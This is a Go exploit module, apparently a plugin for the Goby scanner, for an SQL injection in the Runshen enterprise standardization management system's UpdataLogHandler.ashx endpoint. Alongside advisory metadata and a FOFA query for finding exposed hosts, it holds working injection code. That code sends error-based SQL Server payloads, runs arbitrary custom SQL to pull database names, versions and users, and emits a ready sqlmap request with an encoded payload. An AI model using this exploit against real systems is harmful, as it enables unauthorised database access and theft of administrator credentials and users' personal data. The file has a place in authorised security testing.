package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Runshen Information Technology Enterprise Standardization Management System /UpdataLogHandler.ashx SQL Injection Vulnerability",
    "Description": "<p>By providing customers with a variety of flexible information management solutions for standards and regulations, Runshen Information Technology Enterprise Standardization Management System helps them achieve efficient management of standards and regulations and complete the informatization construction of personalized standards and regulations. </p><p>There is an SQL injection vulnerability in the interface of UpdataLogHandler.ashx, the standardized management system of Runshen Information Technology Enterprise. An attacker can exploit the vulnerability to obtain information in the database (such as the administrator's background password and the site's user personal information), or even write a Trojan to the server in the case of high privilege to further obtain server system privileges.</p>",
    "Product": "Runshen Information Technology Enterprise Standardization Management System",
    "Homepage": "www.scplat.com",
    "DisclosureDate": "2024-04-23",
    "PostTime": "2024-11-06",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"PDCA/js/_publicCom.js\" && body=\"/scripts/Base64.js\"",
    "GobyQuery": "body=\"PDCA/js/_publicCom.js\" && body=\"/scripts/Base64.js\"",
    "Level": "1",
    "Impact": "<p>There is an SQL injection vulnerability in the interface of UpdataLogHandler.ashx, the standardized management system of Runshen Information Technology Enterprise. An attacker can exploit the vulnerability to obtain information in the database (such as the administrator's background password and the site's user personal information), or even write a Trojan to the server in the case of high privilege to further obtain server system privileges.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/138125314"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT @@VERSION",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "润申信息企业标准化管理系统 /UpdataLogHandler.ashx SQL 注入漏洞",
            "Product": "润申信息企业标准化管理系统",
            "Description": "<p>润申信息科技企业标准化管理系统通过给客户提供各种灵活的标准法规信息化管理解决方案，帮助他们实现了高效的标准法规管理，完成个性化标准法规库的信息化建设。<br></p><p>润申信息科技企业标准化管理系统 UpdataLogHandler.ashx 接口处存在SQL注入漏洞。攻击者可利用漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>润申信息科技企业标准化管理系统&nbsp;UpdataLogHandler.ashx 接口处存在SQL注入漏洞。攻击者可利用漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Runshen Information Technology Enterprise Standardization Management System /UpdataLogHandler.ashx SQL Injection Vulnerability",
            "Product": "Runshen Information Technology Enterprise Standardization Management System",
            "Description": "<p>By providing customers with a variety of flexible information management solutions for standards and regulations, Runshen Information Technology Enterprise Standardization Management System helps them achieve efficient management of standards and regulations and complete the informatization construction of personalized standards and regulations.&nbsp;</p><p>There is an SQL injection vulnerability in the interface of UpdataLogHandler.ashx, the standardized management system of Runshen Information Technology Enterprise. An attacker can exploit the vulnerability to obtain information in the database (such as the administrator's background password and the site's user personal information), or even write a Trojan to the server in the case of high privilege to further obtain server system privileges.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability in the interface of UpdataLogHandler.ashx, the standardized management system of Runshen Information Technology Enterprise. An attacker can exploit the vulnerability to obtain information in the database (such as the administrator's background password and the site's user personal information), or even write a Trojan to the server in the case of high privilege to further obtain server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	setSqlPayloadHashsajfgyhasyjgfygasfgdyyatsgftyeagvfthcsgatkydcgukasgygdftgasyfcay := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = `' AND 2232 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)+(` + sql + `)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(98)+CHAR(113))) AND 'FMhc'='FMhc`
			sql = url.QueryEscape(sql)
			sql = `action=GetAll&start=` + sql + `&end=&code=11&type=2&page=1&rows=20`
			postRequest := httpclient.NewPostRequestConfig(sqlUrl)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			postRequest.Data = sql
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/PDCA/ashx/UpdataLogHandler.ashx"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/PDCA/ashx/UpdataLogHandler.ashx"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "tblgqlvq"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT (CHAR(116)+CHAR(98)+CHAR(108)+CHAR(103)+CHAR(113)+CHAR(108)+CHAR(118)+CHAR(113))`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qzbzq((.|\n)*?)qvvbq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashsajfgyhasyjgfygasfgdyyatsgftyeagvfthcsgatkydcgukasgygdftgasyfcay
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /PDCA/ashx/UpdataLogHandler.ashx HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
 
action=GetAll&start=%27%20%41%4e%44%20%32%32%33%32%20%49%4e%20%28%53%45%4c%45%43%54%20%28%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%32%32%29%2b%43%48%41%52%28%39%38%29%2b%43%48%41%52%28%31%32%32%29%2b%43%48%41%52%28%31%31%33%29%2b%28%53%45%4c%45%43%54%20%27%32%32%32%27%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%31%38%29%2b%43%48%41%52%28%31%31%38%29%2b%43%48%41%52%28%39%38%29%2b%43%48%41%52%28%31%31%33%29%29%29%20%41%4e%44%20%27%46%4d%68%63%27%3d%27%46%4d%68%63&end=&code=11&type=2&page=1&rows=20`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qzbzq((.|\n)*?)qvvbq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashsajfgyhasyjgfygasfgdyyatsgftyeagvfthcsgatkydcgukasgygdftgasyfcay
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select DB_NAME()"
					} else if way == "db_version" {
						sql = "select @@VERSION"
					} else if way == "user_name" {
						sql = "select SYSTEM_USER"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
